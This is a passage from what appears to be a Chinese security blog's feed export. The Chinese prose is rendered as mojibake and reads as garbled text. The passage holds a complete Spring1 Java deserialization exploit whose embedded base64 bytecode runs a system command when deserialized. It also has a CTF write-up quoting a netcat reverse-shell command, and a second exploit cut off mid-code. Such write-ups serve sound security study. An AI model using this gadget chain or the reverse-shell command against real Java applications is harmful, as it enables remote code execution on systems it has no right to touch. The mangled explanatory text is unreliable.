å¯¹åº”çš„å€¼ã€‚å› ä¸º <code>memberValues</code> æ˜¯å¯æ§çš„ï¼Œå› æ­¤å¯ä»¥æŒ‡å®šæŸä¸ªæ–¹æ³•çš„è¿”å›å€¼ã€‚</p><p>å¦‚ä¸‹:</p><h2 id="ObjectFactory-Proxy-getObject"><a href="#ObjectFactory-Proxy-getObject" class="headerlink" title="ObjectFactory(Proxy).getObject()"></a>ObjectFactory(Proxy).getObject()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br><span class="hljs-comment">// ä½¿ç”¨åŠ¨æ€ä»£ç†åˆå§‹åŒ– AnnotationInvocationHandler</span><br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br><span class="hljs-comment">// ä½¿ç”¨ AnnotationInvocationHandler åŠ¨æ€ä»£ç† ObjectFactory çš„ getObject æ–¹æ³•ï¼Œä½¿å…¶è¿”å› TemplatesImpl</span><br>ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>        ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br></code></pre></td></tr></table></figure><h2 id="AutowireUtils-ObjectFactoryDelegatingInvocationHandler-invoke"><a href="#AutowireUtils-ObjectFactoryDelegatingInvocationHandler-invoke" class="headerlink" title="AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()"></a>AutowireUtils$ObjectFactoryDelegatingInvocationHandler.invoke()</h2><p>ä½¿ç”¨è¯¥ç±»è¿›è¡Œä¼ å…¥TemplatesImplï¼Œè¿›è¡ŒMethod.invoke()çš„è°ƒç”¨ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>       Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>       ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>              <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br></code></pre></td></tr></table></figure><p>ç°åœ¨è¦è§£å†³çš„é—®é¢˜å°±æ˜¯éœ€è¦ä¼ å…¥Methodâ€”&gt;newTransformã€‚</p><p>è¿™é‡ŒåŒæ—¶ä¹Ÿå¯ä»¥æ³¨æ„åˆ°ObjectFactoryDelegatingInvocationHandleræ˜¯ç»§æ‰¿äº†InvocationHandlerã€‚æ‰€ä»¥åŒæ ·å¯ä»¥åˆ©ç”¨åŠ¨æ€ä»£ç†è¿›è¡Œæ“ä½œã€‚åªéœ€è¦è¿”å›ä¸€ä¸ªæ—¢æ˜¯ Type ç±»å‹åˆæ˜¯ Templates(TemplatesImpl çˆ¶ç±») ç±»å‹çš„ç±»ã€‚åœ¨MethodInvokeTypeProviderä¸­è¿›è¡Œthis.provider.getType()çš„æ—¶å€™åˆ¤æ–­ä¸ä¸ºç©ºï¼Œä¼ å…¥é‚£ä¹ˆå°±å¯ä»¥è¿™æ ·äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br></code></pre></td></tr></table></figure><h2 id="erializableTypeWrapper-TypeProvider-Proxy-getType"><a href="#erializableTypeWrapper-TypeProvider-Proxy-getType" class="headerlink" title="erializableTypeWrapper.TypeProvider(Proxy).getType()"></a>erializableTypeWrapper.TypeProvider(Proxy).getType()</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>     map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br>     <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>     Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>     <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>             <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br></code></pre></td></tr></table></figure><p>æ¥ç€åªéœ€è¦å®ä¾‹åŒ–<code>SerializableTypeWrapper#MethodInvokeTypeProvider</code>ï¼Œå°±å¯ä»¥è§¦å‘ã€‚</p><h2 id="åå°„"><a href="#åå°„" class="headerlink" title="åå°„"></a>åå°„</h2><p>ä¿®æ”¹å€¼ï¼Œé¿å…åºåˆ—åŒ–æ—¶å€™å°±è§¦å‘ã€‚</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span> );<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        name.set(templates,<span class="hljs-string">&quot;xsw6a&quot;</span>);<br><br>        Class&lt;?&gt;       c           = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        HashMap&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br><br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map);<br><br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(<br>                ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler);<br><br><br>        Class&lt;?&gt;       clazz          = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; ofdConstructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        ofdConstructor.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) ofdConstructor.newInstance(factory);<br><br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br>        <br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br><br><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">newInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, newInvocationHandler);<br><br><br><br>        Class&lt;?&gt;       clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; cons   = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        cons.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> cons.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br><br>        <span class="hljs-type">Field</span>  <span class="hljs-variable">field</span>   <span class="hljs-operator">=</span> clazz2.getDeclaredField(<span class="hljs-string">&quot;methodName&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(objects, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br><br>       serialize(objects);<br>       unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        objectOutputStream.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String FileName)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(FileName));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> o;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>Spring1ä¸­è¿ç”¨äº†å¾ˆå¤šçš„åŠ¨æ€ä»£ç†**(ç±»ä¼¼ä¸€ç§å¼ºè½¬ä½¿å¾—æ•´ä¸ªé“¾å­ä»this.objectFactory.getObject()ä»¥åŠ TypeProvider provideré“¾æ¥èµ·æ¥**)ï¼Œä¸»è¦</p><ul><li>åˆ©ç”¨åŠ¨æ€ä»£ç†å°†org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler</li></ul><p>ä¸­çš„method.invoke(è¿”å›å€¼,args)çš„è¿”å›å€¼è®¾ç½®æˆTemplatesImplã€‚</p><ul><li>ä»£ç†ç±»åŒæ—¶æ‹¥æœ‰ä¸¤ä¸ªç±»çš„æ–¹æ³•ï¼Œæ—¢èƒ½è¢«å¼ºè½¬ä¸º TypeProvider.getType() çš„è¿”å›å€¼ï¼Œåˆå¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ° newTransformer æ–¹æ³•ã€‚ä½¿å¾—åœ¨org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProviderä¸­ï¼Œèƒ½å¤Ÿåœ¨this.provider.getType().getClass(), this.methodNameæ‰¾åˆ°å±äºthis.provider.getType().getClass()çš„this.methodName</li></ul><p><strong>å°±æ˜¯åŠ¨æ€ä»£ç†è®¾ç½®ä½¿å¾—rg.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProviderä¸­ï¼Œèƒ½å¤Ÿåœ¨this.provider.getType().getClass(), this.methodNameæ‰¾åˆ°å±äºthis.provider.getType().getClass()çš„this.methodName</strong></p><h2 id="ä¸€äº›å°ç»†èŠ‚ï¼Ÿ"><a href="#ä¸€äº›å°ç»†èŠ‚ï¼Ÿ" class="headerlink" title="ä¸€äº›å°ç»†èŠ‚ï¼Ÿ"></a>ä¸€äº›å°ç»†èŠ‚ï¼Ÿ</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204082359478.png" alt="QQæˆªå›¾20220408235936"></p><p>è¿™é‡Œå¦‚æœä¸æ˜¯getObjectï¼Œå°±ä¼šå¼•å‘æŠ¥é”™ã€‚ä¸‹é¢çš„getTypeä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204090000487.png" alt="QQæˆªå›¾20220409000046"></p><p>è¿™é‡Œä¹Ÿä¸å†åƒccé‚£æ ·æœ‰é™åˆ¶ã€‚ï¼ˆå…¶å®å°±æ˜¯è‡ªå·±å›æƒ³èµ·æ¥ï¼Œè¿™é‡Œè·Ÿccå…³ç³»æ²¡æœ‰å¤šå¤§å…³ç³»ï¼Œéƒ½ç­æœ‰è¿›å…¥readObjectä¸­ï¼‰ä½†æ˜¯å¿…é¡»æ˜¯æ³¨é‡Šç±»å‹ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugku</title>
    <link href="/2022/04/06/Bugku/"/>
    <url>/2022/04/06/Bugku/</url>
    
    <content type="html"><![CDATA[<h1 id="Bugku"><a href="#Bugku" class="headerlink" title="Bugku"></a>Bugku</h1><h2 id="ez-java-serialize"><a href="#ez-java-serialize" class="headerlink" title="ez_java_serialize"></a>ez_java_serialize</h2><p>ä¸‹è½½æºç ï¼Œæ¸…æ™°å¯è§cc</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143676.png" alt="QQæˆªå›¾20220406113052"></p><p>åœ¨ç”¨è‡ªå·±çš„ä»£ç ï¼Œæƒ³è¿›è¡Œæ¶æ„ç±»åŠ è½½<code>åå¼¹shell</code>æˆ–è€…<code>åˆ›é€ å›æ˜¾</code>ï¼ˆæœ¬åœ°æ˜¯å¯ä»¥æ‰“é€šå‘çš„ï¼‰ï¼Œå‡å·²å¤±è´¥å‘Šç»ˆã€‚æœ€åç”¨ysoï¼Œä¸€é”®ç”Ÿæˆä»£ç ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143180.png" alt="QQæˆªå›¾20220406113301"></p><p>è¿™é‡Œç»è¿‡æµ‹è¯•<code>cc5.6.7</code>çš„é“¾å‡å¯ä»¥æ‰“ã€‚ä½†æ˜¯å®é™…ä¸Šè¿™é‡Œæ»¡è¶³æ¡ä»¶çš„è¿˜æœ‰1ï¼Œ3é“¾</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143886.png" alt="QQæˆªå›¾20220406113531"></p><p>1ä¹Ÿæ²¡æœ‰é€šï¼ˆlazymapçš„ç‰ˆæœ¬é™åˆ¶åº”è¯¥æ˜¯ï¼‰ï¼Œ3å› ä¸ºä¹‹å‰è¿›è¡Œç±»åŠ è½½çš„æ—¶å€™å°±æ‰“ä¸é€šï¼Œysoçš„cc3æ˜æ˜¾åˆ©ç”¨äº†ï¼Œæ‰€ä»¥ä¹Ÿæ‰“ä¸é€šã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143916.png" alt="QQæˆªå›¾20220406113933"></p><p>å€¼å¾—æ³¨æ„çš„ä¸€ç‚¹è¿™é‡Œï¼Œåå¼¹shellç”¨çš„  <code>nc ip:port /bin/bash</code><br>æœ€åä¹ŸæˆåŠŸçš„æ‰“äº†å‡ºæ¥ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204061143078.png" alt="QQæˆªå›¾20220406114105"></p><h2 id="ä¸œåæ¯"><a href="#ä¸œåæ¯" class="headerlink" title="ä¸œåæ¯"></a>ä¸œåæ¯</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204090011751.png" alt="QQæˆªå›¾20220409001048"></p><p>ç»•è¿‡é™åˆ¶ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202204090011992.png" alt="QQæˆªå›¾20220409001118"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.ezgame.ctf.tools.ToStringBean;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAKwoACQAcCgAdAB4IAB8KAB0AIAcAIQoABQAiBwAjCgAHABwHACQBAAY8aW5pdD4B&quot;</span> +<br>                <span class="hljs-string">&quot;AAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQABZQEA&quot;</span> +<br>                <span 